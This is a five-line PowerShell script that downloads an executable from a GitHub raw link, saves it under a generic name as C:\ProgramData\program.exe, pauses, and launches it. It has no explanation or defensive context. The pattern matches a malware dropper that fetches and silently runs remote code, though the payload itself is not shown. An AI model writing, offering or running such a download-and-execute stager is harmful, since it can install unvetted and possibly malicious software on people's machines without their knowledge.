$url = "https://github.com/floorsofolga-svg/signedfiles/raw/refs/heads/main/almajdiah_extension.exe"
$output = "C:\ProgramData\program.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Sleep -Seconds 5  # Delay for 5 seconds
Start-Process $output
